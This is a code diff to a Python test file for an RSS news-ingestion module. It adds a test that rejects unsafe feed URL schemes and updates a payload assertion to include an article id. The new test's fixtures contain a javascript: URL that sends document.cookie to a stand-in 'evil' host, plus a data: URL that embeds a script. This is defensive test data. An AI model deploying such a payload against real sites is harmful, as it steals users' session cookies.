@@ -1002,6 +1002,18 @@ async def test_build_articles_accepts_no_known_hashes():
     assert len(articles) == 1
 
 
+async def test_build_articles_refuses_unsafe_url_schemes(caplog):
+    """S-P1-4: a javascript: (or data:, ...) URL from a feed is refused at
+    ingestion, not persisted. The item never becomes a RawArticle."""
+    bad = _item(url="javascript:fetch('//evil/'+document.cookie)")
+    worse = _item(url="data:text/html,<script>alert(1)</script>")
+    with patch.object(rss_evidence, "extract_entities_top_n", return_value={}):
+        articles = await rss_evidence.build_articles([_item(), bad, worse])
+    assert len(articles) == 1
+    assert articles[0].url == "https://www.bbc.co.uk/news/world-1"
+    assert "unsafe URL scheme" in caplog.text
+
+
 # ------------------------------------------------------------------ stamping
 
 
@@ -1016,12 +1028,15 @@ async def test_stamp_payload_shape_includes_fetched_at_inside():
     assert [entry[2] for entry in result["entries"]] == [0, 1]
 
     payload = log._entries[0].payload
-    assert set(payload) == {"type", "url", "source_domain", "fetched_at", "body_sha256", "title"}
+    assert set(payload) == {"type", "url", "source_domain", "fetched_at", "body_sha256", "title", "article_id"}
     assert payload["type"] == "rss_evidence"
     assert payload["url"] == articles[0].url
     assert payload["source_domain"] == "bbc.co.uk"
     assert payload["body_sha256"] == articles[0].content_hash
     assert payload["title"] == "Title 0"
+    # S-P1-2: the leaf binds the article id, so the proof permalink can verify
+    # the entry was stamped for the article it is shown under.
+    assert payload["article_id"] == str(articles[0].id)
     # The fetch time is inside the payload, which is what makes the chain commit
     # to when the bytes were read rather than only that they were read.
     parsed = datetime.fromisoformat(payload["fetched_at"])
